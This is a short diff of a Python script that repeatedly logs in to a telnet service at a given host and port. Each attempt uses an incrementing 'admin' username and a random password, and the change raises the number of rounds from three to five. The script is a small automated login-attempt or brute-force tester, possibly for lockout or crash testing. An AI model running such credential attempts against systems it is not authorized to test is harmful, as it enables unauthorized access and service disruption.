@@ -29,12 +29,12 @@ if __name__=='__main__':
     print("[*] begin","\n")
     start = time.time()
     while True:
-        username = username + str(i+1)
-        password = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(10))
-        i = i+1
-        print ("[*]Round",i,":",username,":",password,"")
-        if i == 3:
+        if i == 5:
             print("Elapsed timestamp: ", time.time() - start)
             break;
+        username = username + str(i+1)
+        password = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(10))
+        print ("[*]Round",i+1,":",username,":",password,"")
         do_telnet(Host, Port, username, password)
         username = "admin"
+        i = i+1
